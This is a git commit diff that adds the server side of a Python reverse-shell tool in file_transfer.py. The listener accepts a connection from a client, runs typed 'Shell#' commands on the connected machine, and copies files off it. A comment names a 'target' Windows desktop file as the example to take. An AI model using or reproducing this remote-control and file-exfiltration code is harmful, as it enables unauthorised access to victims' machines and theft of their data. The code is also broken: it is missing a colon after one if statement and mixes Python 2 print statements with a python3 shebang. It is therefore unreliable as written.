d80eeded46803480703409ae5affeb2aa97f0919
Kul Subedi <subedi.kulprasad@gmail.com>
2017-11-08 10:55:49 -0600

    Update file_transfer.py

--- python_script/shell/file_transfer.py
+++ python_script/shell/file_transfer.py
@@ -1,5 +1,54 @@
 
 
+### SERVER ###
+#!/usr/bin/env python3
+
+import socket
+import os
+
+def make_transfer(conn, command):
+    conn.send(command)
+    fd = open('/root/Desktop/copied_file.txt', 'wb')
+    while 1:
+        bits = conn.recv(1024)
+        if 'File does not exist' in bits:
+            print '[-] File does not exist'
+            break
+        if bits.endswith('DONE')
+            print '[+] Transfer completed '
+            fd.close()
+            break
+        fd.write(bits)
+    fd.close()    
+
+def get_connection():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("SERVER NAME/IP", SERVER_PORT))
+    s.listen(1)
+    conn, addr = s.accept()
+    print '[+] Connection established from: ', addr
+    
+    while 1:
+        command = raw_input("Shell# ")
+        
+        if 'terminate' in command:
+            conn.send('terminate')
+            conn.close()
+            break
+        elif 'transfer' in command:
+            make_transfer(conn, command)
+            #transfer*C:\Users\target\Desktop\sample.txt
+        else:
+            conn.send(command)
+            print conn.recv(1024)
+    
+
+def main():
+    get_connection()
+    
+if __name__=='__main__':
+    main()
+
 ### Client ####
 import os
 import socket
